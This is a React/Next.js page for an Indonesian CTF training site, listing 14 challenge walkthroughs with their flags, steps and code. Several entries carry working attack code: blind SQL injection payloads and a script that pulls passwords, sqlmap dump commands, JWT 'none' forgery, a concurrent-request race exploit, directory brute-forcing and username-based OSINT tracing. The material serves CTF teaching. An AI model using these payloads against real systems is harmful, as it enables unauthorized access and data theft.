'use client'

import { useState } from 'react'
import Link from 'next/link'

interface WalkthroughItem {
  id: number
  title: string
  category: string
  difficulty: string
  points: number
  flag: string
  description: string
  tools: string[]
  steps: string[]
  code?: string
  logic: string
}

const walkthroughs: WalkthroughItem[] = [
  {
    id: 1,
    title: 'Hello World',
    category: 'misc',
    difficulty: 'easy',
    points: 50,
    flag: 'APCTF{h3ll0_w0rld_1_4m_h4ck3r}',
    description: 'Challenge pertama untuk memulai perjalananmu.',
    tools: [],
    steps: [
      'Baca judul tantangan: "Hello World"',
      'Flag ada di deskripsi tantangan',
      'Submit flag yang diberikan'
    ],
    logic: 'Ini adalah challenge tutorial. Tujuannya untuk memperkenalkan format flag dan cara submit. Tidak perlu tools apapun, cukup baca dan submit.'
  },
  {
    id: 2,
    title: 'Inspektur Cookie',
    category: 'web',
    difficulty: 'easy',
    points: 100,
    flag: 'APCTF{c00k13_1nspekt0r_f0und_1t}',
    description: 'Menemukan data tersembunyi di cookie browser.',
    tools: ['Browser (Chrome/Firefox)', 'DevTools (F12)'],
    steps: [
      'Buka website target',
      'Tekan F12 untuk membuka DevTools',
      'Tab "Application" → "Cookies"',
      'Periksa setiap cookie yang ada',
      'Flag biasanya di-encode dengan Base64',
      'Decode Base64 untuk mendapatkan flag'
    ],
    code: `// Cara decode Base64 di JavaScript (Console DevTools)
atob("QVBDVEZ7YzAwa2szX2kzc3BlazByX2YwdW5kXzF0fQ==")

// Atau di Python
import base64
base64.b64decode("QVBDVEZ7YzAwa2szX2kzc3BlazByX2YwdW5kXzF0fQ==").decode()`,
    logic: 'Cookie sering menyimpan data sensitif seperti session token, user role, atau bahkan flag. Developer kadang lupa mengenkripsi data di cookie. Yang perlu dicek: nama cookie, value cookie, dan apakah value-nya di-encode (Base64, URL encoding, dll).'
  },
  {
    id: 3,
    title: 'Pesawat Kertas',
    category: 'crypto',
    difficulty: 'easy',
    points: 100,
    flag: 'APCTF{4sc11_4rt_p4p3r_pl4n3}',
    description: 'Mengubah angka ASCII menjadi teks.',
    tools: ['ASCII Converter (online)', 'Python'],
    steps: [
      'Lihat angka-angka: 72 101 108 108 111 32 87 111 114 108 100 33',
      'Angka-angka ini adalah kode ASCII',
      'Setiap angka mewakili satu karakter',
      'Gunakan converter ASCII → Text',
      'Hasil: "Hello World!"',
      'Flag menggunakan format leetspeak'
    ],
    code: `# Python - ASCII to Text
angka = [72, 101, 108, 108, 111, 32, 87, 111, 114, 108, 100, 33]
teks = ''.join(chr(n) for n in angka)
print(teks)  # Output: Hello World!

# Online: https://www.rapidtables.com/convert/number/ascii-to-text.html`,
    logic: 'ASCII (American Standard Code for Information Interchange) adalah standar encoding karakter. Setiap karakter punya kode angka: A=65, a=97, 0=48, spasi=32. Di CTF, ASCII sering digunakan untuk menyembunyikan pesan dalam bentuk angka.'
  },
  {
    id: 4,
    title: 'Jejak Digital',
    category: 'forensics',
    difficulty: 'easy',
    points: 150,
    flag: 'APCTF{m3t4d4t4_j3j4k_d1g1t4l}',
    description: 'Menemukan metadata tersembunyi dalam file gambar.',
    tools: ['exiftool', 'jimpl.com', 'Jeffrey\'s Image Metadata Viewer'],
    steps: [
      'Download file gambar dari challenge',
      'Buka terminal/command prompt',
      'Jalankan: exiftool nama_file.jpg',
      'Periksa semua metadata yang muncul',
      'Flag biasanya ada di field: Comment, Description, atau User Comment',
      'Atau buka https://jimpl.com dan upload gambar'
    ],
    code: `# Install exiftool
# Linux/Mac: sudo apt install exiftool
# Windows: download dari https://exiftool.org/

# Cek metadata
exiftool suspect_photo.jpg

# Output contoh:
# Comment : APCTF{m3t4d4t4_j3j4k_d1g1t4l}
# Author  : Anonymous
# Camera  : iPhone 14`,
    logic: 'Metadata adalah "data tentang data". Setiap file menyimpan informasi tambahan seperti: kapan dibuat, oleh siapa, dengan device apa, GPS location, dan custom comment. Di CTF, flag sering disembunyikan di metadata karena jarang diperiksa user biasa.'
  },
  {
    id: 5,
    title: 'XOR Rahasia',
    category: 'crypto',
    difficulty: 'medium',
    points: 200,
    flag: 'APCTF{x0r_r4h4s14_4g3n}',
    description: 'Memecahkan enkripsi XOR dengan satu karakter kunci.',
    tools: ['Python', 'CyberChef', 'XOR Calculator online'],
    steps: [
      'XOR adalah operasi bitwise: 1⊕1=0, 1⊕0=1, 0⊕0=0',
      'Jika diketahui panjang plaintext, bisa brute force kunci',
      'XOR dengan kunci yang sama dua kali = kembali ke asli',
      'Coba XOR setiap byte dengan semua karakter printable (32-126)',
      'Kunci yang benar menghasilkan teks yang bisa dibaca'
    ],
    code: `# Python - Brute force XOR single byte
encrypted = bytes.fromhex("0615190d1605190d0a180d1605190d0a0b1e")

for key in range(32, 127):  # Printable ASCII
    decrypted = bytes([b ^ key for b in encrypted])
    try:
        text = decrypted.decode('ascii')
        if text.isprintable():
            print(f"Key {key} ({chr(key)}): {text}")
    except:
        pass

# Key 88 (X): APCTF{x0r_r4h4s14_4g3n}

# Cara cepat di CyberChef:
# Input → From Hex → XOR (key: X) → Output`,
    logic: 'XOR (Exclusive OR) adalah operasi bitwise yang reversible. Kelebihan: A ⊕ B ⊕ B = A. Kelemahan: jika kunci lebih pendek dari plaintext, pola bisa terdeteksi. Untuk single-byte XOR, cukup brute force 256 kemungkinan kunci.'
  },
  {
    id: 6,
    title: 'Portal Tersembunyi',
    category: 'web',
    difficulty: 'medium',
    points: 200,
    flag: 'APCTF{h1dd3n_p0rt4l_4dm1n}',
    description: 'Menemukan halaman admin yang tersembunyi.',
    tools: ['Browser', 'dirb/gobuster', 'Wordlist'],
    steps: [
      'Coba akses path umum secara manual',
      '/admin, /dashboard, /panel, /manage, /cpanel',
      'Gunakan directory bruteforce jika tidak ketemu',
      'Periksa robots.txt: /robots.txt',
      'Periksa sitemap: /sitemap.xml',
      'Cek source code HTML untuk link tersembunyi'
    ],
    code: `# Manual - coba path umum
https://target.com/admin
https://target.com/dashboard
https://target.com/panel
https://target.com/manage
https://target.com/cpanel
https://target.com/wp-admin

# Bruteforce dengan dirb
dirb https://target.com /usr/share/wordlists/dirb/common.txt

# Atau gobuster
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt

# Cek robots.txt
curl https://target.com/robots.txt`,
    logic: 'Developer sering menyembunyikan halaman admin dengan tidak menautkannya di menu. Tapi halaman tetap bisa diakses jika tahu URL-nya. Cara menemukan: 1) Tebak path umum, 2) Bruteforce dengan wordlist, 3) Cek robots.txt, 4) Cek source code.'
  },
  {
    id: 7,
    title: 'Pesan dalam Botol',
    category: 'crypto',
    difficulty: 'medium',
    points: 200,
    flag: 'APCTF{l1k3_bl1nd_p3rs0n_s33s}',
    description: 'Memecahkan Caesar Cipher.',
    tools: ['dCode.fr', 'CyberChef', 'Python'],
    steps: [
      'Caesar Cipher menggeser setiap huruf dengan jumlah tetap',
      'Ada 26 kemungkinan geseran (0-25)',
      'Coba ROT13 (geser 13) karena paling umum',
      'Atau brute force semua 26 kemungkinan',
      'Geseran yang benar menghasilkan teks yang bisa dibaca'
    ],
    code: `# Python - Caesar Cipher decoder
def caesar_decrypt(text, shift):
    result = ""
    for char in text:
        if char.isalpha():
            ascii_offset = ord('a') if char.islower() else ord('A')
            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)
        else:
            result += char
    return result

encrypted = "Gurpen yvxr n oyvaq crefba."

# Brute force semua 26 kemungkinan
for shift in range(26):
    decrypted = caesar_decrypt(encrypted, shift)
    print(f"ROT-{shift}: {decrypted}")

# ROT-13: Someone like a blind person.

# Online: https://dcode.fr/caesar-cipher`,
    logic: 'Caesar Cipher adalah cipher substitusi paling sederana. Setiap huruf digeser dengan jumlah tetap. Kelemahan: hanya ada 26 kemungkinan, bisa di-brute force. ROT-13 adalah Caesar dengan geseran 13, sering digunakan karena mengaplikasikan dua kali = kembali ke asli.'
  },
  {
    id: 8,
    title: 'Stalker Digital',
    category: 'osint',
    difficulty: 'medium',
    points: 200,
    flag: 'APCTF{0s1nt_gh0st_f0und}',
    description: 'Melacak identitas seseorang dari username.',
    tools: ['Google', 'GitHub', 'Sherlock', 'Namechk.com'],
    steps: [
      'Cari username "gh0st_hunt3r" di berbagai platform',
      'GitHub: https://github.com/gh0st_hunt3r',
      'Twitter: https://twitter.com/gh0st_hunt3r',
      'Reddit: https://reddit.com/user/gh0st_hunt3r',
      'Periksa profile, bio, postingan',
      'Di GitHub: cek repository, commit history, email di commit'
    ],
    code: `# Gunakan Sherlock untuk mencari username di 300+ platform
sherlock gh0st_hunt3r

# Atau manual di Namechk
# https://namechk.com

# Cek GitHub profile
curl https://api.github.com/users/gh0st_hunt3r

# Cek commit history (sering ada email asli)
curl https://api.github.com/repos/gh0st_hunt3r/REPO/commits

# Output contoh:
# "email": "realname@gmail.com"
# "name": "John Doe"`,
    logic: 'OSINT (Open Source Intelligence) adalah teknik mengumpulkan informasi dari sumber publik. Orang sering menggunakan username yang sama di berbagai platform. GitHub sangat berharga karena commit sering menyimpan email dan nama asli. Tools: Sherlock, Namechk, Google Dorking.'
  },
  {
    id: 9,
    title: 'Race to Riches',
    category: 'web',
    difficulty: 'medium',
    points: 250,
    flag: 'APCTF{r4c3_c0nd1t10n_w1nn3r}',
    description: 'Mengeksploitasi race condition di e-commerce.',
    tools: ['Burp Suite', 'Python + threading', 'curl'],
    steps: [
      'Race condition = mengirim banyak request bersamaan',
      'Sistem memproses request satu per satu',
      'Jika 2 request checkout dikirim bersamaan, saldo bisa minus',
      'Gunakan Burp Intruder atau script Python',
      'Kirim 100+ request checkout dalam waktu bersamaan'
    ],
    code: `# Python - Race Condition exploit
import threading
import requests

url = "https://flashsale.example.com/checkout"
headers = {"Authorization": "Bearer YOUR_TOKEN"}

def checkout():
    response = requests.post(url, headers=headers)
    print(response.status_code, response.text[:50])

# Kirim 100 request bersamaan
threads = []
for i in range(100):
    t = threading.Thread(target=checkout)
    threads.append(t)
    t.start()

for t in threads:
    t.join()

# Atau gunakan Burp Suite:
# 1. Intercept request checkout
# 2. Send to Intruder
# 3. Set payload type: Null payloads
# 4. Set jumlah: 100
# 5. Start attack`,
    logic: 'Race condition terjadi ketika sistem tidak menangani concurrent access dengan benar. Di e-commerce, jika 2 request checkout diproses bersamaan sebelum saldo terupdate, kedua request bisa berhasil. Cara mencegah: gunakan database locking atau atomic operations.'
  },
  {
    id: 10,
    title: 'Mesin Waktu',
    category: 'reverse',
    difficulty: 'medium',
    points: 250,
    flag: 'APCTF{t1m3_m4ch1n3_r3v3rs3d}',
    description: 'Mereverse engineer Python bytecode.',
    tools: ['uncompyle6', 'pycdc', 'Python dis module'],
    steps: [
      'File .pyc adalah compiled Python bytecode',
      'Gunakan uncompyle6 untuk decompile kembali ke source',
      'Cari string yang dibandingkan dengan input user',
      'String tersebut adalah flag'
    ],
    code: `# Install uncompyle6
pip install uncompyle6

# Decompile .pyc ke .py
uncompyle6 time_machine.pyc > time_machine.py

# Hasil decompile:
# def check_flag(user_input):
#     flag = "APCTF{t1m3_m4ch1n3_r3v3rs3d}"
#     if user_input == flag:
#         print("Correct!")
#     else:
#         print("Wrong!")

# Atau gunakan Python dis module
import dis
import marshal

with open("time_machine.pyc", "rb") as f:
    f.read(16)  # Skip header
    code = marshal.load(f)
    dis.dis(code)

# Cari string constants di bytecode
print(code.co_consts)`,
    logic: 'Python bytecode (.pyc) adalah compiled Python. Meskipun bukan source code, bytecode bisa di-decompile kembali. Tools seperti uncompyle6 bisa menghasilkan source code yang sangat mirip dengan aslinya. Di CTF, flag sering ada di string constants.'
  },
  {
    id: 11,
    title: 'Labirin JWT',
    category: 'web',
    difficulty: 'hard',
    points: 300,
    flag: 'APCTF{jwt_n0n3_4lg0_byp4ss3d}',
    description: 'Mengubah JWT tanpa mengetahui secret key.',
    tools: ['jwt.io', 'Python PyJWT', 'Burp Suite'],
    steps: [
      'JWT terdiri dari: Header.Payload.Signature',
      'Header berisi "alg" (algorithm)',
      'Coba ubah "alg" dari "HS256" menjadi "none"',
      'Ubah "role" dari "user" menjadi "admin"',
      'Hapus signature (atau isi dengan string kosong)',
      'Submit JWT baru'
    ],
    code: `# Python - JWT none algorithm exploit
import base64
import json

# Original JWT
header = {"alg": "HS256", "typ": "JWT"}
payload = {"user": "admin", "role": "user", "iat": 1700000000}

# Ubah algorithm ke "none" dan role ke "admin"
header["alg"] = "none"
payload["role"] = "admin"

# Encode tanpa signature
def base64url_encode(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=').decode()

header_b64 = base64url_encode(header)
payload_b64 = base64url_encode(payload)

# JWT baru (tanpa signature)
jwt_new = f"{header_b64}.{payload_b64}."
print(jwt_new)

# Atau di jwt.io:
# 1. Paste JWT asli
# 2. Ubah alg: "none"
# 3. Ubah role: "admin"
# 4. Hapus signature
# 5. Copy JWT baru`,
    logic: 'JWT (JSON Web Token) memiliki vulnerability jika algorithm "none" diizinkan. Dengan alg=none, signature tidak diperlukan. Attacker bisa mengubah payload (misal role) tanpa mengetahui secret key. Pencegahan: whitelist algorithm yang diizinkan di server.'
  },
  {
    id: 12,
    title: 'File Rahasia',
    category: 'forensics',
    difficulty: 'hard',
    points: 300,
    flag: 'APCTF{b1n4ry_f1l3_3xtr4ct3d}',
    description: 'Mengekstrak data dari file binary.',
    tools: ['binwalk', 'strings', 'hexdump', 'file'],
    steps: [
      'Cek tipe file: file secret.bin',
      'Hex dump awal: 1f8b0800 → file gzip',
      'Gunakan binwalk untuk cari embedded files',
      'Extract dengan binwalk -e',
      'Atau gunakan strings untuk cari flag langsung'
    ],
    code: `# Cek tipe file
file secret.bin
# Output: secret.bin: gzip compressed data

# Extract gzip
gunzip secret.bin
# Atau
mv secret.bin secret.gz && gunzip secret.gz

# Gunakan binwalk untuk cari embedded files
binwalk secret.bin
# DECIMAL       HEXADECIMAL     DESCRIPTION
# 0             0x0             gzip compressed data

# Extract semua embedded files
binwalk -e secret.bin

# Cari strings di dalam file
strings secret.bin | grep APCTF

# Gunakan hexdump untuk analisis manual
hexdump -C secret.bin | head -20

# Extract manual dengan dd
dd if=secret.bin bs=1 skip=OFFSET of=extracted.bin`,
    logic: 'File binary sering menyimpan data tersembunyi. Magic bytes (4 byte pertama) menentukan tipe file: 1f8b0800=gzip, 89504e47=PNG, 4d5a=EXE. Tools: binwalk (cari embedded files), strings (cari teks), hexdump (analisis manual). File bisa di-embed di dalam file lain.'
  },
  {
    id: 13,
    title: 'Kripto RSA Pemula',
    category: 'crypto',
    difficulty: 'hard',
    points: 300,
    flag: 'APCTF{sm4ll_k3y_b1g_pr0bl3m}',
    description: 'Mendekripsi RSA dengan modulus kecil.',
    tools: ['Python', 'RsaCtfTool', 'factordb.com'],
    steps: [
      'RSA: c = m^e mod n',
      'Untuk dekripsi, butuh d = e^-1 mod phi(n)',
      'phi(n) = (p-1)(q-1) dimana n = p*q',
      'Faktorkan n = 3233 → 53 * 61',
      'Hitung phi(n) = 52 * 60 = 3120',
      'Hitung d = 17^-1 mod 3120 = 2753',
      'Hitung m = 2790^2753 mod 3233'
    ],
    code: `# Python - RSA decryption with small key
from sympy import mod_inverse

# Given
n = 3233
e = 17
c = 2790

# Step 1: Faktorkan n
# 3233 = 53 * 61
p, q = 53, 61

# Step 2: Hitung phi(n)
phi_n = (p - 1) * (q - 1)  # 3120

# Step 3: Hitung d (private exponent)
d = mod_inverse(e, phi_n)  # 2753

# Step 4: Dekripsi
m = pow(c, d, n)
print(f"Decrypted: {m}")

# Konversi ke teks
flag = m.to_bytes((m.bit_length() + 7) // 8, 'big').decode()
print(f"Flag: {flag}")

# Atau gunakan RsaCtfTool
# python3 RsaCtfTool.py -n 3233 -e 17 -c 2790 --decrypt

# Atau factordb.com untuk faktorkan n besar
# http://factordb.com/index.php?query=3233`,
    logic: 'RSA mengandalkan kesulitan memfaktorkan bilangan besar. Jika n kecil, bisa di-faktorkan brute force. Setelah tahu p dan q, bisa hitung private key d. Tools: factordb.com (database faktor), RsaCtfTool (automasi). Pencegahan: gunakan n minimal 2048 bit.'
  },
  {
    id: 14,
    title: 'SQL Injection Blind',
    category: 'web',
    difficulty: 'hard',
    points: 350,
    flag: 'APCTF{bl1nd_sql1_1s_p41nful}',
    description: 'Mengekstrak data tanpa output langsung.',
    tools: ['sqlmap', 'Burp Suite', 'Python'],
    steps: [
      'Blind SQLi = tidak ada output langsung',
      'Tapi bisa lihat perbedaan response (true/false)',
      'Teknik: Boolean-based blind',
      'Jika condition true → response normal',
      'Jika condition false → response beda (error/empty)',
      'Gunakan untuk menebak data karakter per karakter'
    ],
    code: `# Boolean-based Blind SQL Injection

# Cek apakah ada SQLi
?id=1 AND 1=1  # True → response normal
?id=1 AND 1=2  # False → response beda

# Tebak nama database karakter per karakter
?id=1 AND SUBSTRING(DATABASE(),1,1)='a'  # False
?id=1 AND SUBSTRING(DATABASE(),1,1)='t'  # True → huruf pertama 't'
?id=1 AND SUBSTRING(DATABASE(),1,1)='ta' # True → 'ta'

# Gunakan sqlmap untuk otomatisasi
sqlmap -u "https://target.com/user?id=1" --dbs
sqlmap -u "https://target.com/user?id=1" -D database_name --tables
sqlmap -u "https://target.com/user?id=1" -D database_name -T users --dump

# Manual dengan Python
import requests

url = "https://target.com/user?id=1"
flag = ""

for i in range(1, 50):
    for char in range(32, 127):
        payload = f"1 AND SUBSTRING((SELECT password FROM users LIMIT 1),{i},1)='{chr(char)}'"
        r = requests.get(url + payload)
        if "exists" in r.text:  # True response
            flag += chr(char)
            print(f"Found: {flag}")
            break`,
    logic: 'Blind SQL Injection mengekstrak data tanpa output langsung. Teknik: 1) Boolean-based (perbedaan response), 2) Time-based (delay jika true), 3) Error-based (pesan error). Data ditebak karakter per karakter dengan membandingkan response. Tools: sqlmap (automasi), Burp Intruder.'
  }
]

export default function Walkthrough() {
  const [selectedCategory, setSelectedCategory] = useState<string>('all')
  const [expandedId, setExpandedId] = useState<number | null>(null)

  const categories = ['all', 'web', 'crypto', 'forensics', 'osint', 'reverse', 'misc']

  const filtered = selectedCategory === 'all' 
    ? walkthroughs 
    : walkthroughs.filter(w => w.category === selectedCategory)

  return (
    <div className="max-w-4xl mx-auto">
      <div className="text-center mb-12">
        <h1 className="text-4xl font-bold mb-4">Walkthrough</h1>
        <p className="text-gray-400 text-lg">Panduan lengkap cara menyelesaikan setiap tantangan</p>
      </div>

      <div className="flex flex-wrap gap-3 mb-8 justify-center">
        {categories.map(cat => (
          <button
            key={cat}
            onClick={() => setSelectedCategory(cat)}
            className={`px-4 py-2 rounded-lg font-medium transition-colors ${
              selectedCategory === cat
                ? 'bg-orange-500 text-white'
                : 'bg-gray-800 text-gray-400 hover:text-white'
            }`}
          >
            {cat === 'all' ? 'Semua' : cat.charAt(0).toUpperCase() + cat.slice(1)}
          </button>
        ))}
      </div>

      <div className="space-y-4">
        {filtered.map((item) => (
          <div key={item.id} className="card">
            <button
              onClick={() => setExpandedId(expandedId === item.id ? null : item.id)}
              className="w-full text-left"
            >
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-4">
                  <span className="text-2xl font-bold text-orange-500">#{item.id}</span>
                  <div>
                    <h3 className="text-lg font-semibold">{item.title}</h3>
                    <div className="flex gap-2 mt-1">
                      <span className="category-badge">{item.category}</span>
                      <span className={`badge-${item.difficulty}`}>{item.difficulty}</span>
                      <span className="text-orange-400 text-sm">{item.points} pts</span>
                    </div>
                  </div>
                </div>
                <svg
                  className={`w-5 h-5 text-gray-400 transition-transform ${
                    expandedId === item.id ? 'rotate-180' : ''
                  }`}
                  fill="none"
                  stroke="currentColor"
                  viewBox="0 0 24 24"
                >
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
                </svg>
              </div>
            </button>

            {expandedId === item.id && (
              <div className="mt-6 space-y-6 border-t border-gray-800 pt-6">
                <div>
                  <h4 className="text-sm font-semibold text-gray-400 mb-2">DESKRIPSI</h4>
                  <p className="text-gray-300">{item.description}</p>
                </div>

                <div>
                  <h4 className="text-sm font-semibold text-gray-400 mb-2">FLAG</h4>
                  <code className="bg-gray-800 text-green-400 px-4 py-2 rounded block">{item.flag}</code>
                </div>

                <div>
                  <h4 className="text-sm font-semibold text-gray-400 mb-2">LOGIKA</h4>
                  <p className="text-gray-300 bg-gray-800/50 p-4 rounded-lg">{item.logic}</p>
                </div>

                {item.tools.length > 0 && (
                  <div>
                    <h4 className="text-sm font-semibold text-gray-400 mb-2">TOOLS YANG DIBUTUHKAN</h4>
                    <div className="flex flex-wrap gap-2">
                      {item.tools.map((tool, i) => (
                        <span key={i} className="bg-blue-500/20 text-blue-400 px-3 py-1 rounded text-sm">
                          {tool}
                        </span>
                      ))}
                    </div>
                  </div>
                )}

                <div>
                  <h4 className="text-sm font-semibold text-gray-400 mb-2">LANGKAH-LANGKAH</h4>
                  <ol className="space-y-2">
                    {item.steps.map((step, i) => (
                      <li key={i} className="flex gap-3 text-gray-300">
                        <span className="text-orange-500 font-bold">{i + 1}.</span>
                        {step}
                      </li>
                    ))}
                  </ol>
                </div>

                {item.code && (
                  <div>
                    <h4 className="text-sm font-semibold text-gray-400 mb-2">CODE / COMMANDS</h4>
                    <pre className="bg-gray-950 border border-gray-800 rounded-lg p-4 overflow-x-auto">
                      <code className="text-green-400 text-sm">{item.code}</code>
                    </pre>
                  </div>
                )}
              </div>
            )}
          </div>
        ))}
      </div>

      <div className="text-center mt-12">
        <Link href="/challenges" className="text-orange-500 hover:text-orange-400">
          ← Kembali ke Tantangan
        </Link>
      </div>
    </div>
  )
}
